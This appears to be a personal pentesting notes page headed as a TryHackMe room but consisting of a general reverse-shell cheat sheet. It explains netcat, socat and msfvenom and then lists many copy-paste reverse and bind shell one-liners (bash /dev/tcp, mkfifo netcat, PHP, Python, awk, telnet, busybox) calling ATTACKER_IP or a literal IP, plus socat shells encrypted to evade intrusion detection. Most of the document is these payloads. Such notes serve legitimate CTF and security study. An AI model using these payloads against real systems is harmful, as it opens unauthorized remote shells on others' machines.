---
title: 'TryHackMe: Umbrella'
author: jrg1a
categories: [Red Team]
tags: [shell, , docker, mysql, rce]
render_with_liquid: false
img_path: /images/RedTeam/
image:
  path: revshell.webp
---

# Reverse Shell

## Types of shell

###### PHP shell
```php
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Shell

> A shell is what we use when interfacing with a Command Line Environment (CLI). The common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows

A server can be forces to send us command access to the server (Rever Shell), or to open a port on the server which we can connect through and start executing further commands (Bind Shell). 

---
#### <mark style="background: #FFB8EBA6;">Tools</mark>
There are several tools that will be used when trying to receive reverse shells or send bind shells. We need malicious shell code, as well as a way of interfacing with the resulting shell.
##### <mark style="background: #FF5582A6;">Netcat</mark>
Often named the "Swiss Army Knife" of networking, and is used for all kinds of network interactions(banner grabbing, reverse shells, connect to remote ports, etc). But the shells in Netcat are not stable and easy to lose by default. So techniques to improve the shells must be taken. 

##### <mark style="background: #FFB86CA6;">Socat</mark>
A stable shell that can do all the same things as Netcat and more. Out of the box, the shell in Socat is more stable, but has an more advanced syntax and does not come pre-installed on many distributions by default. 

##### <mark style="background: #FFF3A3A6;">Metasploit: Multi/handler</mark>
The `exploit/multi/handler` module is used to receive reverse shells, and since its part of the Metasploit Framework it comes with a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It's also the only way to interact with a _meterpreter_ shell, and is the easiest way to handle _staged_ payloads

##### <mark style="background: #BBFABBA6;">Msfvenom</mark>
Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Msfvenom can generate payloads other than reverse and bind shells, and its an incredibly powerful tool. 


---
### Netcat

Netcat is the most basic tool in a pentester's toolkit when it comes to any kind of networking. With it we can do a wide variety of interesting things, but let's focus for now on shells.

###### Reverse Shells
The syntax for starting a netcat listener using Linux is this:
`nc -lvnp <port-number>`
- `-l` tells netcat there's a listener
- `-v` verbose output
- `-n` disables dns resolution (does not resolve host names)
- `-p` port specification

example: `nc -lvnp 4444` 

if you want to use a port-number below 1024, `sudo` is needed. 

###### Bind Shells
If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. The syntax for this is relatively straight forward:
`nc <target-ip> <chosen-port>`

Here we are using netcat to make an outbound connection to the target on our chosen port.


#### Stabilization

1. `python -c 'import pty;pty.spawn("/bin/bash")'` 
2. `export TERM=xterm`
3. we will background the shell using Ctrl + Z, then use `stty raw -echo; fg` in our own terminal, which turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys,and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

---
### SoCat

>Similar to netcat in some ways, but fundamentally different in many others.

**Reverse Shell**:
- Rev Shell Listener: `socat TCP-L:<port> -`
- Windows: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
- Linux: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

**Bind Shell**:
- Linux: `socat TCP-L:<PORT> EXEC:"bash -li"`
- Windows: `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
- Rev Shell Listener: `socat TCP:<TARGET-IP>:<TARGET-PORT> -`

**Other:**
- Fully Stable Linux Shell: ``socat TCP-L:<port> FILE:`tty`,raw,echo=0``
- `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

**Encrypted Shells**:
Avoid IDS and spying on the shell by encrypting!
- Generate Certificate: `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
- Merge into a single .pem file: `cat shell.key shell.crt > shell.pem`
- Reverse shell listener: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
- To connect back we use: `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`
Same technique applies for bind shell:
- Target: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
- Attacker: `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

---
### Common Shell Payloads

- `/usr/share/windows-resources/binarie`
- `netcat-traditional`
There is a `-e` option which allows you to execute a process on connection
- `nc -lvnp <PORT> -e /bin/bash`

Same for a Rev Shell, connecting back with `nc <LOCAL-IP> <PORT> -e /bin/bash` would result in a reverse shell on the target. 
**NB!** this is not included in most versions of netcat as it is widely seen to be very insecure

On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:
- `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
- description of this command: > _The command first creates a [named pipe](https://www.linuxjournal.com/article/2156) at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle._
A very similar command can be used to send a netcat reverse shell:
- `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
- This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.

When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.
This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:


<mark style="background: #FFB86CA6;">Link to one-liner</mark> (due to firewall detection deleting the notation file): [link](https://github.com/jrg1a/CTF/blob/main/Privilege%20Escalation/Reverse%20Shell.md)


In order to use this, we need to replace `<IP>` and `<port>` with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell 

For other common reverse shell payloads, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages.

---
### Msfvenom

Syntax: `msfvenom -p <PAYLOAD> <OPTIONS>`

E.g. Windows x64 Reverse Shell
- `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`


---

#### References

[[Windows PrivEsc]]

[[Authentication Bypass]]

[[IDOR]]

[[File Inclusion]]

[[SSRF]]

### Payloads

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`

**Normal Bash Reverse Shell**
```shell-session
target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
```

**Bash Read Line** **Reverse Shell**
```shell-session
target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
```

**Bash With File Descriptor 196** **Reverse Shell**
```shell-session
target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
```

**Bash With File Descriptor 5** **Reverse Shell**
```shell-session
target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

#### PHP
**PHP Reverse Shell Using the exec Function**
```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
```

**PHP Reverse Shell Using the shell_exec Function**
```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

**PHP Reverse Shell Using the system Function**
```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
```

**PHP Reverse Shell Using the passthru Function**
```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

**PHP Reverse Shell Using the popen Function**
```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
```


#### Python

**Python Reverse Shell by Exporting Environment Variables**
```shell-session
target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
```


**Python Reverse Shell Using the subprocess Module**
```shell-session
target@tryhackme:~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
```

**Short Python Reverse Shell**
```shell-session
target@tryhackme:~$ python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

#### Others

**Telnet**
```shell-session
target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```

**AWK**
```shell-session
target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

**BusyBox**
```shell-session
target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
```
